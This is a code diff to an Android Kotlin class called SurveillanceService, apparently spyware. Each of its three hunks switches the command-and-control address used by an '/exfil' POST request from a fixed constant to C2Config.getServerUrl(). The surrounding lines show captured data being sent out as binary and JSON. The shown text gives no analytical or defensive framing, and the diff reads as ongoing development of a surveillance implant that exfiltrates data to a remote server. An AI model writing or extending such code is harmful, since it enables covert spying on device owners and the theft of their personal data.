@@ -565,7 +565,7 @@ class SurveillanceService : Service() {
             Thread {
                 var connection: HttpURLConnection? = null
                 try {
-                    val url = URL("${C2Config.HTTP_SERVER_URL}/exfil")
+                    val url = URL("${C2Config.getServerUrl()}/exfil")
                     connection = url.openConnection() as HttpURLConnection
                     connection.requestMethod = "POST"
                     connection.setRequestProperty("Content-Type", "application/octet-stream")
@@ -635,7 +635,7 @@ class SurveillanceService : Service() {
         Thread {
             var connection: HttpURLConnection? = null
             try {
-                val url = URL("${C2Config.HTTP_SERVER_URL}/exfil")
+                val url = URL("${C2Config.getServerUrl()}/exfil")
                 connection = url.openConnection() as HttpURLConnection
                 connection.requestMethod = "POST"
                 connection.setRequestProperty("Content-Type", "application/json")
@@ -672,7 +672,7 @@ class SurveillanceService : Service() {
         Thread {
             var connection: HttpURLConnection? = null
             try {
-                val url = URL("${C2Config.HTTP_SERVER_URL}/exfil")
+                val url = URL("${C2Config.getServerUrl()}/exfil")
                 connection = url.openConnection() as HttpURLConnection
                 connection.requestMethod = "POST"
                 connection.setRequestProperty("Content-Type", "application/octet-stream")
